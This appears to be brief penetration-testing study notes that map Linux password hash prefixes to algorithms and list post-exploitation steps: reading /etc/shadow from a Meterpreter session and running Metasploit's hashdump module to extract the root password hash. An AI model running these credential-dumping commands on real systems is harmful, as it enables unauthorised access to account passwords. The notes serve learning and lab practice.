Types of Hashing algorithm: 

| Value | Hashing Algorithm |
| ----- | ----------------- |
| $1    | MD5               |
| $2    | Blowfish          |
| $5    | SHA-256           |
| $6    | SHA-512           |
**whit meterpreter session**:
cat /etc/shadow
root: **$password-hash$**

- Cracking hash: 
	-hash dump module (msf): 
	```bash
	search hashdump
	#gather/hashdump
	set SESSION 2 
	run
	#root:  **$password-hash$**
	#Unshadowed Password File /root/route/etc/etc/etc...
```
